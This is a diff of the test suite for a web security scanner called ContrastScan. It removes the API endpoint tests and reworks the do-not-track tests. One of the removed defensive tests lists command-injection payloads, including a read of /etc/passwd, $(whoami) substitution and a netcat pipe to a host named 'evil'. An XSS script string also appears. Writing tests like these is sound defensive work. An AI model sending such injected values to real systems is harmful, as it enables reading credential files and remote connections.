@@ -155,14 +155,6 @@ class TestPages:
         r = client.get("/")
         assert "og:title" in r.text
 
-    def test_api_page_status(self):
-        r = client.get("/api")
-        assert r.status_code == 200
-
-    def test_api_page_contains_api(self):
-        r = client.get("/api")
-        assert "API" in r.text
-
     def test_stats_page_status(self):
         r = client.get("/stats")
         assert r.status_code == 200
@@ -422,147 +414,6 @@ class TestCsrfE2e:
             assert r.status_code == 403
 
 
-# === API endpoint ===
-
-
-class TestApiEndpoint:
-    def test_api_scan_status(self):
-        with (
-            patch("scanner.run_scan", side_effect=mock_run_scan),
-            patch("scanner.validate_domain", side_effect=mock_validate_domain),
-        ):
-            r = client.get("/api/scan?domain=example.com")
-            assert r.status_code == 200
-
-    def test_api_returns_json(self):
-        with (
-            patch("scanner.run_scan", side_effect=mock_run_scan),
-            patch("scanner.validate_domain", side_effect=mock_validate_domain),
-        ):
-            r = client.get("/api/scan?domain=example.com")
-            assert isinstance(r.json(), dict)
-
-    def test_api_json_has_domain(self):
-        with (
-            patch("scanner.run_scan", side_effect=mock_run_scan),
-            patch("scanner.validate_domain", side_effect=mock_validate_domain),
-        ):
-            r = client.get("/api/scan?domain=example.com")
-            assert r.json().get("domain") == "example.com"
-
-    def test_api_json_has_grade(self):
-        with (
-            patch("scanner.run_scan", side_effect=mock_run_scan),
-            patch("scanner.validate_domain", side_effect=mock_validate_domain),
-        ):
-            r = client.get("/api/scan?domain=example.com")
-            assert "grade" in r.json()
-
-    def test_api_json_has_total_score(self):
-        with (
-            patch("scanner.run_scan", side_effect=mock_run_scan),
-            patch("scanner.validate_domain", side_effect=mock_validate_domain),
-        ):
-            r = client.get("/api/scan?domain=example.com")
-            assert "total_score" in r.json()
-
-    def test_api_json_has_11_modules(self):
-        with (
-            patch("scanner.run_scan", side_effect=mock_run_scan),
-            patch("scanner.validate_domain", side_effect=mock_validate_domain),
-        ):
-            r = client.get("/api/scan?domain=example.com")
-            data = r.json()
-            assert all(
-                k in data
-                for k in [
-                    "headers",
-                    "ssl",
-                    "dns",
-                    "redirect",
-                    "disclosure",
-                    "cookies",
-                    "dnssec",
-                    "methods",
-                    "cors",
-                    "html",
-                    "csp_analysis",
-                ]
-            )
-
-    def test_api_json_has_findings(self):
-        with (
-            patch("scanner.run_scan", side_effect=mock_run_scan),
-            patch("scanner.validate_domain", side_effect=mock_validate_domain),
-        ):
-            r = client.get("/api/scan?domain=example.com")
-            assert "findings" in r.json()
-
-    def test_api_json_has_findings_count(self):
-        with (
-            patch("scanner.run_scan", side_effect=mock_run_scan),
-            patch("scanner.validate_domain", side_effect=mock_validate_domain),
-        ):
-            r = client.get("/api/scan?domain=example.com")
-            assert "findings_count" in r.json()
-
-    def test_invalid_domain_400(self):
-        r = client.get("/api/scan?domain=invalid")
-        assert r.status_code == 400
-
-    def test_missing_domain_422(self):
-        r = client.get("/api/scan")
-        assert r.status_code == 422
-
-    def test_api_report_status(self):
-        with (
-            patch("scanner.run_scan", side_effect=mock_run_scan),
-            patch("scanner.validate_domain", side_effect=mock_validate_domain),
-        ):
-            r = client.get("/api/report?domain=example.com")
-            assert r.status_code == 200
-
-    def test_api_report_is_text(self):
-        with (
-            patch("scanner.run_scan", side_effect=mock_run_scan),
-            patch("scanner.validate_domain", side_effect=mock_validate_domain),
-        ):
-            r = client.get("/api/report?domain=example.com")
-            assert "text/plain" in r.headers.get("content-type", "")
-
-    def test_api_report_has_attachment(self):
-        with (
-            patch("scanner.run_scan", side_effect=mock_run_scan),
-            patch("scanner.validate_domain", side_effect=mock_validate_domain),
-        ):
-            r = client.get("/api/report?domain=example.com")
-            assert "attachment" in r.headers.get("content-disposition", "")
-
-    def test_api_report_has_domain(self):
-        with (
-            patch("scanner.run_scan", side_effect=mock_run_scan),
-            patch("scanner.validate_domain", side_effect=mock_validate_domain),
-        ):
-            r = client.get("/api/report?domain=example.com")
-            assert "example.com" in r.text
-
-    def test_api_report_has_grade(self):
-        with (
-            patch("scanner.run_scan", side_effect=mock_run_scan),
-            patch("scanner.validate_domain", side_effect=mock_validate_domain),
-        ):
-            r = client.get("/api/report?domain=example.com")
-            assert "Grade:" in r.text
-
-    def test_api_report_has_module_breakdown(self):
-        with (
-            patch("scanner.run_scan", side_effect=mock_run_scan),
-            patch("scanner.validate_domain", side_effect=mock_validate_domain),
-        ):
-            r = client.get("/api/report?domain=example.com")
-            assert "MODULE BREAKDOWN" in r.text
-
-
 # === Rate limiting ===
 
 
@@ -774,11 +625,9 @@ class TestBadge:
 
 
 class TestOpenApiHidden:
-    def test_openapi_json_200(self):
+    def test_openapi_json_404(self):
         r = client.get("/openapi.json")
-        assert r.status_code == 200
-        data = r.json()
-        assert data["info"]["title"] == "ContrastScan"
+        assert r.status_code == 404
 
     def test_docs_404(self):
         r = client.get("/docs")
@@ -849,17 +698,6 @@ class TestXssPrevention:
         assert r.status_code == 200
         # Raw <script> should NOT appear — Jinja2 auto-escapes to &lt;script&gt;
         assert "<script>alert(1)</script>" not in r.text
-
-    def test_xss_in_api_response_is_json_safe(self):
-        """API responses are JSON — XSS payloads should be string-escaped."""
-        with (
-            patch("scanner.run_scan", side_effect=mock_run_scan),
-            patch("scanner.validate_domain", side_effect=mock_validate_domain),
-        ):
-            r = client.get("/api/scan?domain=example.com")
-            raw = r.text
-            # JSON-encoded strings won't execute as HTML
-            assert "<script>" not in raw or '"<script>' in raw or "\\u003c" in raw.lower()
 
 
 # === SECURITY: CSRF Enforcement via HTTP ===
@@ -945,47 +783,16 @@ class TestReportPathTraversalE2e:
         assert r.status_code == 404
 
 
-# === SECURITY: Command Injection via HTTP ===
-
-
-class TestCommandInjectionE2e:
-    """Verify shell metacharacters in domain are rejected at HTTP level."""
-
-    @pytest.mark.parametrize(
-        "payload",
-        [
-            "example.com; cat /etc/passwd",
-            "$(whoami).com",
-            "`id`.com",
-            "example.com | nc evil 4444",
-        ],
-    )
-    def test_shell_metachar_rejected_400(self, payload):
-        r = client.get("/api/scan", params={"domain": payload})
-        assert r.status_code == 400
-
-
 # === SECURITY: API Error Messages Don't Leak Info ===
 
 
 class TestApiErrorLeakage:
     """Verify error responses don't expose internal paths or stack traces."""
 
-    def test_invalid_domain_error_no_path_leak(self):
-        r = client.get("/api/scan?domain=invalid")
-        assert "/tmp/" not in r.text
-        assert "/home/" not in r.text
-        assert "Traceback" not in r.text
-
     def test_404_no_path_leak(self):
         r = client.get("/result/nonexistent")
         assert "/tmp/" not in r.text
         assert "Traceback" not in r.text
-
-    def test_invalid_api_key_no_hash_leak(self):
-        r = client.get("/api/scan?domain=example.com", headers={"Authorization": "Bearer csc_invalid123"})
-        assert "sha256" not in r.text.lower()
-        assert "hash" not in r.text.lower()
 
 
 # === SECURITY: Badge SVG Injection ===
@@ -1212,20 +1019,35 @@ class TestDntSupport:
     @patch("main.perform_scan")
     def test_dnt_header_passes_dnt_true(self, mock_scan):
         mock_scan.return_value = ("abc123", {"grade": "A", "total_score": 90})
-        client.get("/api/scan?domain=example.com", headers={"dnt": "1"})
+        client.post(
+            "/scan",
+            data={"domain": "example.com"},
+            headers={"dnt": "1", "Origin": "https://contrastcyber.com"},
+            follow_redirects=False,
+        )
         mock_scan.assert_called_once()
         assert mock_scan.call_args[1].get("dnt") is True or mock_scan.call_args[0][2] is True
 
     @patch("main.perform_scan")
     def test_sec_gpc_header_passes_dnt_true(self, mock_scan):
         mock_scan.return_value = ("abc123", {"grade": "A", "total_score": 90})
-        client.get("/api/scan?domain=example.com", headers={"sec-gpc": "1"})
+        client.post(
+            "/scan",
+            data={"domain": "example.com"},
+            headers={"sec-gpc": "1", "Origin": "https://contrastcyber.com"},
+            follow_redirects=False,
+        )
         mock_scan.assert_called_once()
         assert mock_scan.call_args[1].get("dnt") is True or mock_scan.call_args[0][2] is True
 
     @patch("main.perform_scan")
     def test_no_dnt_header_passes_dnt_false(self, mock_scan):
         mock_scan.return_value = ("abc123", {"grade": "A", "total_score": 90})
-        client.get("/api/scan?domain=example.com")
+        client.post(
+            "/scan",
+            data={"domain": "example.com"},
+            headers={"Origin": "https://contrastcyber.com"},
+            follow_redirects=False,
+        )
         mock_scan.assert_called_once()
         assert mock_scan.call_args[1].get("dnt") is False or mock_scan.call_args[0][2] is False
